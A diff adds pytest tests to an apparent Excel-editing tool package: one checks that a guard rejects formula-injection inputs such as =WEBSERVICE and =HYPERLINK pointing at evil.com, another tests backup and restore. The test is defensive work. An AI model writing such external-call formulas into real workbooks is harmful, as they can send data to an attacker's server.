@@ -192,3 +192,57 @@ def test_clear_range_full_column_unbounded(workbook_path):
     wb.close()
 
 
+
+from xlsx_tools_mcp.errors import UnsafeFormulaError
+
+def test_formula_injection_guard(workbook_path):
+    with pytest.raises(UnsafeFormulaError):
+        writer.write_cells(workbook_path, "Data", [{"cell": "A1", "formula": "=WEBSERVICE(\"http://evil.com\")"}])
+    
+    with pytest.raises(UnsafeFormulaError):
+        writer.write_cells(workbook_path, "Data", [{"cell": "A1", "formula": "+WEBSERVICE(\"http://evil.com\")"}])
+
+    with pytest.raises(UnsafeFormulaError):
+        writer.write_cells(workbook_path, "Data", [{"cell": "A1", "value": "=indirect(\"A1\")"}])
+
+    with pytest.raises(UnsafeFormulaError):
+        writer.write_cells(workbook_path, "Data", [{"cell": "A1", "formula": "=hyperlink(\"http://evil.com\")"}])
+
+    # Should not raise when allow_external_formulas=True
+    writer.write_cells(workbook_path, "Data", [{"cell": "A1", "formula": "=WEBSERVICE(\"http://evil.com\")"}], allow_external_formulas=True, recalculate=False)
+    
+def test_auto_backup_creation_and_restore(workbook_path, monkeypatch, tmp_path):
+    import os
+    import glob
+    from pathlib import Path
+    
+    # write initial state
+    writer.write_cells(workbook_path, "Data", [{"cell": "A1", "value": "original"}], recalculate=False)
+    
+    # Set backup dir to a tmp dir to avoid clutter
+    backup_dir = tmp_path / "backups"
+    monkeypatch.setattr("xlsx_tools_mcp.io.writer.BACKUP_DIR", str(backup_dir))
+    
+    # Write something with backup
+    writer.write_cells(workbook_path, "Data", [{"cell": "A1", "value": "mutated"}], recalculate=False, backup=True)
+    
+    backups = list(backup_dir.glob("*.bak"))
+    assert len(backups) == 1
+    
+    # Check that mutated is in the file
+    from xlsx_tools_mcp.io import reader
+    assert reader.read_sheet(workbook_path, "Data")["rows"][0][0] == "mutated"
+    
+    # Test extension validations in restore_backup
+    with pytest.raises(ValueError, match="non-backup file"):
+        writer.restore_backup(workbook_path, workbook_path)
+    with pytest.raises(ValueError, match="non-Excel file"):
+        writer.restore_backup(str(backups[0]), str(tmp_path / "notes.txt"))
+
+    # restore
+    writer.restore_backup(str(backups[0]), workbook_path)
+    
+    # Check that original is restored
+    assert reader.read_sheet(workbook_path, "Data")["rows"][0][0] == "original"
+
+
